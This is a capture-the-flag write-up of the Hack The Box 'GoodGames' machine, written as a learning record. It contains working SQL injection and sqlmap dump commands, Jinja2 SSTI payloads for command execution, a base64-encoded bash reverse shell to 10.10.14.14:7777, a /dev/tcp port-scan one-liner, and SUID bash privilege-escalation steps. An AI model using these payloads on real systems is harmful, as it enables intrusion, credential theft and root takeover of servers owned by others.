# Good Games HTB (Linux)

Headed over to the web page using the IP address. 
Was ale to see that is a web app that sells games, writes articles and blogs about them.
In the bottom I was able to see a domain, GoodGames.HTB


# Profile

I was able to create a profile and sign in.
We can change our password. Maybe we can use this to change the admins?

Admin does not exist already sine I was able to create a new account witht the same username.

On the top right of the profile logged screen we are able to click on the profile icon and log out icon, but also a settings icon, **http://internal-administration.goodgames.htb/**.
I will add this to me /etc/hosts file and see if I can access it that way.

Now I was re routed to a Flask(Volt) login dashboard.
Was not able to get much from here.Tried a simple SQL injection and another one with HTTP tampering. SQL map was also used but no luck.

# Going back to web app

I found that one of the posts was made by by **Wolfenstein**. 
Did not matter because I was able to regirster with the same username so it means it does not exist as well.

In forget password it sends to email, so we can scratch that. 
Ran feroxbuster but did not give me anything juicy. Will try to find now subdomains.

Nothing on both directories and subdomains.

## MISTAKE MISTAKE

Enumerate everything I came across the Flask login page and tried to use an SQLi but did not work. MISTAKE was that I never tried it for the goodgames web page.

With `' or 1=1-- -` I was able to intercept login form and change it from the valid email to the SQLi payload. 
I was then logged in automatically into the admins profile. 
A GOOD SIDE NOTE:
because I registered with **admin** "nickname" I thought that admin did not exist within the system. But I was wrong.
And the reason it did was because the different emails the "admin" nickname is registered on. 
The actual admin was registerd under its own unique admin email. Once I found that I decided to run another SQLmap this time with its actual email.

# SQLmap 

Starting where I left off; I used the correct value admin email that I found logging in with SQLi. I put the email value in the login form with a dummy value password.
I grabbed that request from burp and used right click, Copy to file and saved under ggs.req.

I am now able to use my SQLmap command:
`sqlmap -r ggs.req --dbs --dump --batch`

It took it's time but it confirmed that it was injectable and it also dumped a password for admin user.
It found a **db** called `main` and found a **table** called `user`. Here it SQLmap was able to retrieve **admin's** password.

Using **https://crackstation.net/** I was able to crack the hashed password.

# Flask login 

Going back to the flask login I logged in with **admin** and the password I cracked.

Navigating to the settings page we notice that we can edit our user details. As this is a Python
Flask application this would be a good time to test the form for Server Side Template Injection.
After changing my username and adding a date and number, I noticed that sent a request; with this request I sent to repeater and tried insert **{{7*7}}** into the **name** value, we see that our username has been changed to 49
and our SSTI payload was executed in burp.

To gain RCE with Jinja (template engine for Flask):
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
`

In burp again I was able to confirm that it did work.
Changing the commands around I was easily able to find the user flag with, `find / user.txt`.
Then simply, `cat /home/theuser/user.txt`

# Root 

Now to find **root**. When I first `whoami` it showed that I was already root. Tried the same find commmand as above but as I thought no luck.

With `ls` again I was able to find this in burp:
`                           <h4 class="h3">
                                Dockerfile
project
requirements.txt


                            </h4>`

To make life easier I set up a shell:
`echo -ne 'bash -i >& /dev/tcp/10.10.14.14/7777 0>&1' | base64`

* `echo -ne '...'` → prints the reverse shell command without adding a newline (`-n`) and interprets escape characters (`-e`).
* `bash -i >& /dev/tcp/10.10.14.14/7777 0>&1` → opens an **interactive bash shell** and sends input/output to a remote IP (`10.10.14.14`) on port `7777` via TCP.
* `| base64` → encodes that command in **Base64**.

Then after I constructed a basic SSTI payload to deliver on site through the **name** field:
```{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC83Nzc3IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}```

**What it does:**

* `{{ ... }}` → executes Python code in a Jinja2 template context.
* `config.__class__.__init__.__globals__['os']` → accesses the `os` module via Python object traversal.
* `popen()` → executes a shell command and captures the output.
* `echo${IFS}...` → `echo` the base64-encoded reverse shell payload, using `${IFS}` (Internal Field Separator) to replace spaces — a technique to bypass certain input restrictions.
* `| base64${IFS}-d | bash` → decodes the base64 string and pipes it to bash to execute.

**Decoded string:**
`YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC83Nzc3IDA+JjE=` →
decodes to:

```bash
bash -i >& /dev/tcp/10.10.14.14/7777 0>&1
```

**This SSTI payload executes a reverse shell by base64-decoding it on the server and piping it to bash, connecting back to your listener at `10.10.14.14:7777`.**

From I was able to get a shell.

A directory list of user augustus home directory shows that instead of their name, the UID 1000
is displayed as the owner for the available files and folders. This hints that the user's home
directory is mounted inside the docker container from the main system. Checking mount we see
that the user directory from the host is indeed mounted with read/write flag enabled.

`netstat -tulpn` did not give me much but `netstat -antup` did.

And showed:
```
netstat -antup
netstat -antup
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8085            0.0.0.0:*               LISTEN      1/python3           
tcp        0      0 127.0.0.11:34187        0.0.0.0:*               LISTEN      -                   
tcp        1      0 172.19.0.2:8085         172.19.0.1:48990        CLOSE_WAIT  1/python3           
tcp        0     15 172.19.0.2:54540        10.10.14.14:7777        ESTABLISHED 896/bash            
udp        0      0 127.0.0.11:42864        0.0.0.0:*           
```
One other foreign address shows one other host, which should be for Docker which I saw earlier.

A quick port scan shows it’s listening on 22 and 80:https
`for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null`

```
<19.0.1/$port && echo "$port open"; done 2>/dev/null
22 open
80 open

```
A quick `curl` confirms that it returns back to the GoodgGames.htb website.

When I tired to ssh to the new ip/host I found it did not let me but with a simple `python3 -c 'import pty; pty.spawn("/bin/bash")'
` I was able to fix it.

Now, `ssh augustus@172.19.0.19` and using the cracked password I got, I was able to succesfully log in.


So what I did here was a classic **SUID privilege escalation** trick.

### First, while I was connected as the `augustus` user on the target machine, I made a local copy of the system’s bash binary:

```bash
cp /bin/bash .
```

The reason I copied it is because I wanted to modify its permissions later, and I can’t do that on `/bin/bash` directly without root.

Then, I exited out of that SSH session back to my root shell on the attacking system (Docker container).

Once I was back as `root`, I changed the ownership of that copied `bash` binary to `root:root`:

```bash
chown root:root bash
```

This is important because for a **SUID** to work, the file needs to be owned by root.

Next, I added the **SUID bit** using:

```bash
chmod 4755 bash
```

The `4` in `4755` represents the SUID permission — which means anyone who runs this binary will execute it **as the file’s owner** (which is now root).

After that, I SSH’d back into the `augustus` account on the target machine.

Once I was back, I confirmed the permissions on the `bash` binary:

```bash
ls -la bash
```

I saw:

```
-rwsr-xr-x 1 root root 1234376 Jul  1 05:08 bash
```

The `s` in the owner’s execute position (`rws`) told me the SUID bit was set.

Now for the good part — I ran:

`./bash -p
`

The `-p` flag here tells bash to **preserve the effective user ID** — meaning even though I’m the `augustus` user, this bash process runs as **root** because of the SUID bit.

My prompt changed to:

```
bash-5.1#
```
That’s when I knew I was root.

From there, I went straight to:

```bash
cd /root
ls
cat root.txt
```
And grabbed the root flag.


# Key Takeaways
Always test for SQL injection on every form, including login forms and user profile pages.

SSTI in Python Flask apps is commonly exploitable via {{7*7}} or code execution payloads using popen().

Docker containers may mount host directories with insufficient isolation — check ownership UIDs.

SUID binaries are a classic, reliable privilege escalation vector when improperly managed.

Never assume accounts don’t exist just because you can register the same username; systems often key off email addresses or IDs.

# Things to Remember
Add discovered domains to /etc/hosts immediately during enumeration.

Don’t overlook main login forms when testing for injection.

SSTI exploitation often starts with simple math expressions ({{7*7}}).

Check mount points and open ports inside containers — they can reveal host services and paths.

Use netstat -antup and bash TCP port scanning one-liners for quick open port discovery.

Always verify the SUID bit with ls -la before executing a privilege escalation.

Use bash -p to preserve privileges when executing an SUID bash binary.

# Summary
This machine involved exploiting a SQL injection vulnerability in the main GoodGames login form to extract database credentials and crack the admin password.
With admin access to the Flask dashboard, I exploited a Server-Side Template Injection vulnerability to gain remote command execution, eventually spawning a reverse shell.
Inside the Docker container, I identified a mounted host directory and open ports, then accessed SSH as a low-privileged user.
Finally, I escalated privileges using a classic SUID bash technique by copying bash, setting the SUID bit, and executing it to gain a root shell, allowing me to capture the root flag.


